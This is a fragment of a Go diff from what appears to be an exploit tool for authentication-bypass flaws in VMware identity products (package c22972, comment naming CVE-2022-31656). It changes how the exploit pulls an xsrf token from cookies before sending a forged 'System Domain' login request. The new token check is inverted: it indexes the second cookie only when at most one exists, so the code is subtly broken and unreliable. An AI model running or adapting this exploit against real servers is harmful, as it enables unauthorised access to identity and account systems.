@@ -3,12 +3,11 @@ package c22972
 /* cve-2022-31656 too*/
 import (
 	"fmt"
+	"github.com/imroc/req/v3"
 	"os"
 	"regexp"
 	"strings"
 	"time"
-
-	"github.com/imroc/req/v3"
 )
 
 func Start(url, host, cve string) {
@@ -62,7 +61,14 @@ func Exploit(url, host string) {
 	}
 
 	content := resp.String()
-	xsrf_token := resp.Cookies()[1].Value
+	xsrf_token := ""
+	if len(resp.Cookies()) <= 1 {
+		xsrf_token = resp.Cookies()[1].Value
+	} else {
+		fmt.Println("[-] Failed to get xsrf token...")
+		os.Exit(0)
+	}
+
 	data := map[string]string{
 		"protected_state":   "e" + getprotectState(content),
 		"userStoreName":     "System Domain",
